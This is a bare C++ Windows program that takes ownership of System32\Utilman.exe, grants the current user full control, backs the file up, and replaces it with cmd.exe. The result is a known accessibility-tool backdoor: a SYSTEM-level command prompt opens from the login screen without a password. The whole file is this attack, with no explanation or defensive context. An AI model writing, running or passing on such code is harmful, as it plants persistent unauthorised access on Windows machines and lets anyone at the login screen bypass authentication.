#include <windows.h>
#include <iostream>
#include <Lmcons.h>
#include <string>

int main(int argc, char *argv[])
{
    char username[UNLEN+1] = {0};
    DWORD username_len = UNLEN+1;
    GetUserName(username, &username_len);
    std::string rightCommand = "cacls C:\\Windows\\System32\\Utilman.exe /e /p " + std::string(username) + ":F";
    system("takeown /F C:\\Windows\\System32\\Utilman.exe");
    system(rightCommand.c_str());
    system("copy C:\\Windows\\System32\\Utilman.exe C:\\Windows\\System32\\Utilman2.exe");
    system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe");
}


